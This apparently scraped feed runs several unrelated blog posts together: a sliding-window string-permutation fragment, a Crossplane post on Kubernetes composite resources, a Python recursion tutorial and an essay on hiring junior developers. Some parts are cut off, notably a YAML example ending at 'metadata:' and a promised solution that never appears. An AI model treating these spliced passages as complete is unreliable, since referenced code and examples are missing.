sliding window problem than the problem we just worked through, but if you think of a string as an array of characters and a substring as a subarray, then the similarities start to show.</p><p>I'm not going to walk through each logical step to get to the optimal solution (that would take a minute!), but here are the main ideas:</p><ol><li>A string can only be a permutation of another if it's the same length. <em>This gives us the size of the window = <code>pattern.length</code></em>.</li><li>A string is <strong>exactly</strong> a permutation of another if it contains the exact same number of letters. A way to keep track of this is through a map of character -&gt; count pairs. <em>This gives us the state that we have to maintain</em>.</li><li>We need a way to update <em>and compare</em> the map in constant time. <em>Through this we fulfill the second condition of synchronizing state through constant operations</em>.</li></ol><p>With those ideas, here's the final solution:</p><p>If you're interested in more details of the algorithm (particularly the constant-time updates and comparison), open the note below!</p></article></main></div></div>]]>

				<p>Kubernetes has demonstrated the power of a well architected control plane with a great API. The industry is beginning to notice that this control plane can be used to do much more than orchestrate containers, and are increasingly looking to use the Kubernetes control plane to manage all of their infrastructure.</p><p>Several “cloud provider infrastructure” addons exist for Kubernetes. These addons provide a Kubernetes interface to a cloud provider’s infrastructure - databases, queues, etc. The three major clouds each maintain their own - Google Config Connector, Azure Service Operator, and Amazon Controllers for Kubernetes. Each exposes their respective cloud’s control plane APIs as custom resources, allowing Kubernetes users to manage an RDS instance (for example) using the same tools they would use to manage a <code>Deployment</code> or a <code>ConfigMap</code>.</p><figure><img src="https://blog.crossplane.io/content/images/2021/02/HeaderHero.svg"><figcaption>Crossplane exposes all of the major cloud provider control plane APIs as custom resources.</figcaption></figure><p>Crossplane is often compared to the various cloud provider infrastructure addons. There are certainly similarities - it is also a Kubernetes addon, and it also exposes all of the major cloud provider control plane APIs as custom resources. Crossplane even <a href="https://blog.crossplane.io/accelerating-crossplane-provider-coverage-with-ack-and-azure-code-generation-towards-100-percent-coverage-of-all-cloud-services/">shares code with some of these addons</a>. Where Crossplane differs is in how we expose cloud provider APIs.</p><blockquote>
<p>The Crossplane community believes that the typical developer using Kubernetes to deploy their application shouldn’t have to deal with low level infrastructure APIs.</p>
</blockquote>
<p>Drawing on our experiences as platform builders, SREs, and application developers we’ve designed Crossplane as a toolkit to build your own custom resources on top of any API - often those of the cloud providers. We think this approach is critical to enable <em>usable</em> self-service infrastructure in Kubernetes.</p><p>In this post we’ll demonstrate that seemingly simple tasks like spinning up a new database in the cloud for your applications to consume can often be more complicated than it would at first seem, and how Crossplane is designed to help tame that complexity.</p><p>Crossplane today consists of three things:</p><ol><li><em>Providers</em> extend Crossplane with custom resources that can be used to declaratively configure a system. The AWS provider for example, adds custom resources for AWS services like RDS and S3. We call these ‘managed resources’. Managed resources match the APIs of the system they represent as closely as possible, but they’re also opinionated. Common functionality like status conditions and references work the same no matter which provider you’re using - all managed resources comply with the Crossplane Resource Model, or XRM.</li><li><em>Composition</em> allows a platform team to define new custom resources that are composed of managed resources. We call these composite resources, or XRs. An XR typically groups together a handful of managed resources into one logical resource, exposing only the settings that the platform team deems useful and deferring the rest to an API-server-side template we call a ‘Composition’.</li><li><em>Packages</em> allow a platform team to quickly package, share, and declaratively install new kinds of composite resources and the providers they build on.</li></ol><blockquote>Despite the name, “provider” doesn’t necessarily mean “cloud provider”. Crossplane has providers that add support for managing databases on a SQL server, managing Helm releases, and <a href="https://blog.crossplane.io/providers-101-ordering-pizza-with-kubernetes-and-crossplane/">ordering pizza</a>.</blockquote><figure><img src="https://blog.crossplane.io/content/images/2021/02/Crossplanecity.svg"><figcaption>When we founded Crossplane we focused on supporting the most useful resources.</figcaption></figure><p>When we founded the Crossplane project we started at the managed resource layer. We focused on the resources we thought would be the most useful to application developers - things like cloud databases, caches, and storage buckets. We quickly heard from early adopters that being able to spin up these resources alone <em>wasn’t enough</em>. An RDS instance might also need a security group or a subnet group to be reachable. GCP Cloud SQL instances and Azure SQL servers face similar issues. This pattern permeates cloud infrastructure; another example we see often is folks wanting to create an IAM policy for each DynamoDB table they create. </p><p>Let’s dig into the example of an application developer requesting an SQL database for their application to use. An experience you initially hope will look like this:</p><pre><code>apiVersion: database.aws.crossplane.io/v1beta1
kind: RDSInstance
metadata:

<p>You might notice that we create a database and a user in the above example - something the RDS API does not support natively.</p><blockquote>Sometimes spinning up practically functional infrastructure requires multiple providers - even if you only use one cloud. In this case we use the SQL provider to finish what we started with the AWS provider.</blockquote><p>This will be an imposing amount of configuration for some application developers. They want to be able to self service their infrastructure needs, but shouldn’t need to be experts in the features and functionality of cloud provider APIs to do so. This is where Composition comes in - it allows a platform team to offer their application developers an experience much closer to the one they originally envisioned. Using Composition the application developer experience can look like this:</p><pre><code>apiVersion: example.org/v1
kind: ExampleCoDatabase
metadata:
  name: example
spec:
  parameters:
    storageGB: 20
    username: example-user
  compositionSelector:
    matchLabels:
      engine: mysql
      class: production
  writeConnectionSecretToRef:
    name: example-database-credentials 
</code></pre>
<p>This is a composite resource - an XR.</p><blockquote>When an application developer creates, updates, or deletes this XR Crossplane can create, update, or delete the more verbose set of managed resources from the previous example.</blockquote><p>Composition allows the infrastructure experts - the platform team - to determine what settings their application developers need, and how to use those settings to produce an RDS instance, security group, database, etc. In this example the application developer can influence the size of the database but not its backup settings, which are enforced by the platform team.</p><figure><img src="https://blog.crossplane.io/content/images/2021/02/CrossplaneConsole@2x.png"><figcaption>Framing your opinions at the API level fosters automation and eases integration.</figcaption></figure><p>You may wonder why a platform team would use Composition rather than a familiar, existing tool like Helm or Kustomize. While it’s true that there are similarities, we feel that it’s better to frame your organisation's opinions at the API level, rather than via client-side tooling. For example when you use Crossplane to expose the above purpose-built <code>ExampleCoDatabase</code> API:</p><ul><li>Any REST client (from kubectl to curl to Python) can create an <code>ExampleCoDatabase</code> with a single API call. This fosters automation and eases integration with other systems.</li><li>Policy is enforced. RBAC can ensure at the API level that application developers may influence only the fields exposed by an <code>ExampleCoDatabase</code> XR. The platform team can ensure application developers have RBAC access to configure the settings they need, and nothing else.</li><li>RBAC is framed around your desired abstractions. Access is granted “to create an ExampleCo database”, not “to create an RDS instance, a security group, etc etc”.</li></ul><p>One novel design folks notice when they start using Crossplane is that most Crossplane custom resources are cluster scoped - they exist above the scope of any Kubernetes namespace. While this can seem odd at first, it’s another decision that was informed by real world scenarios.</p><p>Take the above <code>ExampleCoDatabase</code> XR. Assume that several teams of application developers, each with their own namespace, want …</p></section></div>

<p>If you understand the underlying concept of recursion but struggle to implement it like myself, or you don't even know what it is, then this post if for you.</p>
<p>Recursion is defined as solving a complex problem by breaking the problem into smaller versions of itself that can be solved. In programming, this is done by having a function call itself.</p>
<p>The underlying principle of recursion are these two cases:</p>
<ol>
<li><p><strong>Base Case</strong>: this case defines the smallest instance of a problem. In certain recursive solutions, there can be multiple base cases but for the purpose of this post's explanation, my example will only incorporate one. When coding, the base case prevents an infinite loop of the function calling itself.</p>
</li>
<li><p><strong>Recursive Case</strong>: this case manipulates the problem in order to approach the base case. In programming, this is the case in which the function calls itself.</p>
</li>
</ol>
<p>Put simply, the recursive case will breakdown the problem until it arrives at the base case, after which the the sub solutions build up to solve the original problem.</p>
<p>Do not worry if your understanding of recursion is hazy because the above definitions will make sense when implementing a recursive solution in Python.</p>
<h2 id="the-call-stack">The Call Stack</h2>
<p>In order to truly understand how recursion is implemented in Python, it is necessary to familiarize yourself with the call stack. </p>
<p>The call stack uses the stack data structure to keep track of local variables and previous function calls. The stack is a last-in, first-out data structure. This means that the last item to be placed in the stack will be the first to be removed. To help visualize, think of a stack of plates:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612217672194/K8ZCDamI8.jpeg?auto=compress" alt="brooke-lark-sG-PR0BNwb4-unsplash.jpg"></p>
<p>Whatever plate is placed last on the stack is the first one to be removed.</p>
<p>In terms of programming, the stack has two simple operations: push and pop. Push adds an item onto the stack and pop removes an item from the stack, returning its value.</p>
<p>In python, the call stack consists of frames. The bottom most frame is the global or module frame. This consists of all the global variables. Every time a function is called a new frame is pushed onto the stack containing its local variables and function arguments. When a function call returns, the frame is popped off the stack and its value is passed to where it was called in the previous frame.</p>
<h2 id="a-famous-recursion-example-factorial">A Famous Recursion Example - Factorial</h2>
<p>The factorial of a number is defined as so:</p>
<p>4! = 4 * 3 * 2 * 1 = 24</p>
<p>If we were to define the factorial of a number <code>n</code> as a mathematical equation, it would be:</p>
<p><code>factorial(n) = n * factorial(n-1)</code></p>
<p>The right side of the equation will be the <em>recursive case</em> of our solution. Notice, how the recursive case takes the original problem,<code>factorial(n)</code>, and makes it a simpler problem of multiplying <code>n</code> by whatever <code>factorial(n-1)</code> is.</p>
<p>We can define a function <code>factorial</code> that takes a parameter <code>n</code>. However, if we only defined this function with the above equation, it would call itself infinitely leading to an error.</p>
<p>This is because we did not define a <em>base case</em>. The most basic factorial is the factorial of 1 which equals 1. So we can tell the program that once it reaches the factorial of 1, instead of calling <code>1 * factorial(0)</code>, to just <code>return 1</code>. After which, the Python call stack will handle multiplying out the numbers.</p>
<p>After defining both the recursive and base cases, we arrive at the Python program below:</p>
<pre><code><span><span>def</span> <span>factorial</span>(<span>n</span>):</span>
    <span>if</span> n &lt;= <span>1</span>:
        <span>return</span> <span>1</span>
    <span>else</span>:
        <span>return</span> n * factorial(n<span>-1</span>)
</code></pre><h2 id="in-depth-recursive-function-implementation">In Depth Recursive Function Implementation</h2>
<p>Before calling the factorial function, the Python call stack would look like:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612222009642/RKv1SGozi.png?auto=compress" alt="Call Stack - 1 (3).png"></p>
<p>Then, we call the factorial function passing in an argument of 4. </p>
<pre><code><span>factorial</span>(<span>4</span>)
</code></pre><p>A frame for the factorial function would be pushed onto to the call stack, setting the argument <code>n</code> equal to <code>4</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612222128046/cNmno7-YI.png?auto=compress" alt="Call Stack - 2.png"></p>
<p>The Python interpreter will then process the function and since <code>n</code> is not <code>&lt;= 1</code>, it will evaluate <code>n * factorial(n-1)</code>. However before the function can return a value, it must evaluate <code>factorial(n-1)</code>. This will cause another factorial frame to be pushed on the stack, with the argument <code>n</code> set to <code>3</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612222294743/zXgfi23TF.png?auto=compress" alt="Call Stack - 3.png"></p>
<p>Again, since <code>n</code> is not <code>&lt;= 1</code>, the function will evaluate <code>n * factorial(n-1)</code>. Likewise, the function must evaluate <code>factorial(n-1)</code> before returning a value. </p>
<p>This pattern will continue until the factorial frame with the argument n equal to 1 is pushed onto the stack.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612222730246/6jJduzt8q.png?auto=compress" alt="Call Stack - 5 (1).png"></p>
<p>When this occurs, the function reaches the base case, so it instead returns 1. As I mentioned early when explaining the call stack, when a function returns, it pops its frame off the stack, transferring its value to where it was called in the previous frame.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612222867866/Npx8dueYc.png?auto=compress" alt="Call Stack - 6.png"></p>
<p>Now since the value for <code>factorial(n-1)</code> has been evaluated, the factorial function can evaluate the product and return it to the previous frame, pushing the current frame off the stack.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612222963799/kJ7D_a-7I.png?auto=compress" alt="Call Stack - 7.png"></p>
<p>This pattern continues until we reach the original function call...</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1612223032269/rxZsqVaa8.png?auto=compress" alt="Call Stack - 8.png"></p>
<p>As you might have guessed, the factorial function with argument 4 returns a value of 24.</p>
<h2 id="summary">Summary</h2>
<p>When writing a recursive solution in Python, think of the problem in terms of a base case and recursive case. Ask yourself: "How can I define a recursive case that will help me reduce the problem towards a base case?"</p>
<p>When trying to understand a recursive solution, I find it best to visualize the call stack in my head.  Every time a function is called an item is added onto the stack and any time you encounter the return keyword, it pops an item off the stack and returns its value to the previous function call.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>It’s very hard to get hired as an entry-level software developer today.</p><p>There are more than ten times as many senior web developer jobs for every junior web developer job on both VentureLoop.com (jobs at startups) and Indeed.com. Browsing through companies that have recently IPO’d or raised $100M+ rounds — where one would expect a company to be able to hire junior developers — all I can find are jobs that require at least three or more years of experience or are explicitly only hiring “Senior” or “Developer II” or higher.</p><p>I have been working with bootcamp graduates and community-college graduates for years. But from my vantage point, when growth companies hire people with no development job experience, they are usually hiring top-tier, four-year college graduates. (There are some exceptions! Twitter’s <a href="https://careers.twitter.com/en/university.html">internship program</a> is admirable, although I don’t know in practice how restrictive the admissions end up being).<a href="https://twitter.com/shaft/status/1355696154990628864"></a></p><p><a href="https://twitter.com/mxcl/status/608682016205344768"></a>One can understand wanting to make sure that the first few hires into any department have enough experience to build and maintain high quality software, except that</p><p>a) that often doesn’t prevent terrible technical debt, and</p><p>b) no one ever changes the expectations over time.</p><p>And so the culture just becomes, “we only hire people with experience.” I am a huge fan of <a href="https://www.segment.com/">Segment</a> (and a happy customer for more than five years), but despite their senior-developer-packed engineering roster, they seem to have to rebuild their <a href="https://segment.com/blog/goodbye-microservices/">entire architecture</a> <a href="https://techcrunch.com/2021/01/05/how-segment-redesigned-its-core-systems-to-solve-an-existential-scaling-crisis/">every</a> <a href="https://segment.com/blog/rebuilding-our-infrastructure/">few</a> years. Every company starts by hiring seniors; most seem to keep hiring seniors, and many have to keep throwing away code constantly.</p><figure><img src="https://lh4.googleusercontent.com/BsxIM1LBghJkWOwT56C-wwa7lGYJbB9sJPYjYd-A2Dq7zKkJVO98_I3qSOZazzGzxkJkx_gqA4KBK1lm0st213MAaiRfakQxgcACtziqc7hsW5z3wfbtzmbN87DR9bB4NtACKSi2" alt=""></figure><p>Everyone agrees that talent is scarce, and that hires often fail — and that failure is expensive. Why don’t companies ever take a conscious look at how to build talent instead of buying it?</p><p>Put another way, it’s ironic that an industry that tends to want to build everything instead of buying it chooses to buy the absolute most expensive thing on the market: talent.&nbsp;</p><h2 id="h-the-problems-with-senior-developers">The Problems with Senior Developers</h2><p><strong>It is a fallacy that only hiring senior developers will lead to better results than hiring many junior developers</strong>. There are bad things about senior developers that no one should want in their organization, and without juniors to counterbalance, you’ll be overindexed to these downsides.</p><h4 id="h-senior-skills-can-stagnate">Senior skills can stagnate</h4><p>The most common error I see senior developers make comes, ironically, from their prior successes, combined with the pace of technology.</p><p>Most developers at the beginning of their careers are good at knowing and using most of the best practices at that time. But there is no continuing education in software development, and compensation is tied to shipping, not learning. So once a developer is five or more years into their career, there’s a really good chance they’re still relying upon tools, libraries, and practices that are no longer the best way to build, deploy, and run software.</p><p>Case in point: Instagram, all on the public cloud, <a href="https://www.dailymail.co.uk/news/article-2127343/Facebook-buys-Instagram-13-employees-share-100m-CEO-Kevin-Systrom-set-make-400m.html">sells to Facebook</a> for $1B with 13 employees in 2012; Bank of America <a href="https://newsroom.ibm.com/2019-11-06-IBM-Developing-Worlds-First-Financial-Services-Ready-Public-Cloud-Bank-of-America-Joins-as-First-Collaborator">makes its first announcement</a> to do anything with the public cloud in November of 2019. Kevin Systrom <a href="https://www.businessinsider.com/instagram-founder-kevin-systrom-has-no-formal-programming-training-2012-4">had only just learned to program</a> when he started Instagram; Bank of America’s technology organization is run by people who are decades from being practitioners. (Lest anyone try to argue Bank of America’s slowness is due to regulatory issues, <a href="https://get.acloudguru.com/capital-one-case-study">consider Capital One</a>).</p><h4 id="h-senior-developers-can-be-a-solution-in-search-of-a-problem">Senior developers can be a solution in search of a problem</h4><p>Another problem with senior-developer-only organizations is that <strong>most organizations don’t have constant flows of work that require lots of experience</strong>. A tremendous amount of software development is updating interfaces to add functionality or improve usability, not building back ends from scratch that have to scale to hundreds of millions of daily users.</p><p>And as we have better and more powerful <a href="https://www.infoq.com/articles/serverless-sea-change/">cloud services</a> to build on (e.g., AWS, GCP, Azure, Netlify, Twilio, Stripe), more developer focus turns to interfaces. Having an organization filled with senior developers who aren’t mentoring junior developers is asking to find senior-developer problems to solve, even if they’re best solved by an existing service.</p><h2 id="h-finding-undervalued-people">Finding Undervalued People</h2><p>Many developers are systemically undervalued because they do not fit central casting for appearance or mentality. Others are undervalued because organizations typically aren’t willing to hire software developers who need some training to do the job effectively.&nbsp;</p><p>Instead, whatever cargo-cult exercise an individual had to learn to become an interviewer (e.g., inverting binary trees on a whiteboard) tends to be viewed like a fraternity hazing ritual: “I had to go through it, so I’ll make everyone else after me go through it.”</p><p>There are excellent software developers who hate hackathons and would rather spend time raising their children on weekends than on coding side projects. There are people who are neuroatypical who can’t deal well with your unrealistic, on-the-spot brain teasers. There are people who need some additional training and mentorship to be able to ship software effectively for most organizations. These people are all undervalued by the standard hiring practices in tech, which means that, with some effort on your part, they’ll give the highest return on investment of any hires you can make.</p><h2 id="h-when-you-invest-in-people-people-invest-in-you">When you invest in people, people invest in you</h2><p>Over the past twenty years, I have seen a real difference between hiring software developers with the view of, “You’re a superstar and we need you to come in and kick ass” versus, “We will bring you in, teach you how we think and build, and then you’ll help us achieve our mission.”</p><p>The former attitude can lead to developers thinking they are better than other departments and other people in the organization, because no one else can do what they do. (After all, they are superstars!) The latter is fundamentally aligning to a mission and a team and a culture.</p><p>Remember, all software developers pick up bad habits. They usually don’t know all the latest best practices. They generally haven’t been given work time and space to experiment with new technologies. They won’t know all of your code or your stack or how your teams’ specific approaches to software development. These generalizations hold true for all developers, junior to senior.</p><p>You can choose to not invest any effort into training and aligning senior developers and still see things ship, but that doesn’t mean that you’re growing cohesive teams that are making the right decisions for your organization. You should invest in bringing everyone up to speed and together. When you do that, you realize that <strong>bringing junior developers onboard is not necessarily a greater effort than bringing senior developers onboard</strong>, especially if your criteria for success is successful, happy teams that are making the best decisions.</p><h2 id="h-how-to-build-undervalued-talent">How to build undervalued talent</h2><p>If you hire undervalued people and you train them to be successful for your organization, you will end up with teams that are more aligned and more loyal to your mission. The right way to do this is to onboard people in stages that end up with developers working on your codebase, as opposed to hiring everyone with the expectation that they’re working high-priority tickets on day one.</p><p>For example, at Branch, we have a multi-stage process where entry-level developers are initially granted a stipend to fund living expenses while taking online courses, working through sample exercises, and attending office hours for any questions. The end of the first stage is completing the Branch take-home developer hiring exercise that we have used to hire all developers.</p><p>The second stage is a paid internship that has the goal of learning how to work as part of the development team, but having the space to go slowly and ask lots of questions, and the expectation that there may be many PR revisions. We identify tickets in our backlog as “intern” work, so that there isn’t high pressure to complete anything in a short period of time.</p><p>This entire process does take time from the existing development staff, but it can be contained (mostly) into onboarding, office hours, code reviews, and weekly 1-on-1s. And it allows you to make hiring decisions that exclude bad cultural fits because you will find enough talent by investing in your workforce. You’ll create a massive competitive advantage over your competitors who are still stuck in their fraternity-hazing ruts.</p><h2 id="h-the-roi-of-building-talent">The ROI of building talent</h2><figure><div><blockquote data-width="500" data-dnt="true"><div lang="en" dir="ltr"><p>There is a delicious irony that so many venture-backed companies seek only to hire out of expensive four-year universities or people with experience working at other VC-backed startups, yet want their teams to be dedicated to the company's mission.</p><p>1/</p></div>— Joe Emison (@JoeEmison) <a href="https://twitter.com/JoeEmison/status/1343222725226209280?ref_src=twsrc%5Etfw">December 27, 2020</a></blockquote> </div></figure><p>Many venture-backed companies seek people dedicated to their missions, but then shoot themselves in the foot by only looking to hire people from “elite” schools or out of “name-brand” venture-backed companies. Those hiring pools are filled with people who are ready and able to job-hop to further themselves, and are often very weakly committed to company missions. In contrast, if a company invests in undervalued people who need some mentorship, training, and experience to reach their full potential, those people are much more likely to commit to the company and the mission with their full selves.</p><p><em>Joe Emison is the CTO of Branch Insurance, which provides home and auto insurance.
